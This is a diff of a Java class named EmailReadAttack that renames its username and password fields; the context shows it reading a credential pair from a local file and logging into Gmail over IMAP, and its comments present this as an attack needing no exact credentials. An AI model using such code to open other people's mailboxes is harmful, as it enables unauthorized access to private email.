@@ -35,13 +35,13 @@ import jakarta.mail.event.MessageChangedListener;
  * However, you do not need to know the exact login credentials for the attack.
  * 
  * @author Pranav Amarnath
- * @version April 12, 2021
+ * @version April 19, 2021
  *
  */
 public class EmailReadAttack {
 
-	private String USERNAME;
-	private String PASSWORD;
+	private String username;
+	private String password;
 	private final int IMAPS_PORT = 993;
 	private final String HOST = "imap.googlemail.com";
 	private final String PATH = "/credentials.txt";
@@ -69,15 +69,15 @@ public class EmailReadAttack {
 		// create properties field
 		Properties properties = new Properties();
 		properties.setProperty("mail.imaps.partialfetch", "false");
-		properties.setProperty("mail.user", USERNAME);
-		properties.setProperty("mail.password", PASSWORD);
+		properties.setProperty("mail.user", username);
+		properties.setProperty("mail.password", password);
 
 		Session emailSession = Session.getDefaultInstance(properties);
 
 		Store store = emailSession.getStore("imaps");
 
 		try {
-			store.connect(HOST, IMAPS_PORT, USERNAME, PASSWORD);
+			store.connect(HOST, IMAPS_PORT, username, password);
 		} catch (Exception e) {
 			e.printStackTrace();
 			return;
@@ -152,10 +152,10 @@ public class EmailReadAttack {
 				int i = 0;
 				while((line = br.readLine()) != null) {
 					if(i % 2 == 0) {
-						USERNAME = line;
+						username = line;
 					}
 					else {
-						PASSWORD = line;
+						password = line;
 						break; // Even if there are other usernames and passwords, we only want the first pair.
 					}
 					i++;
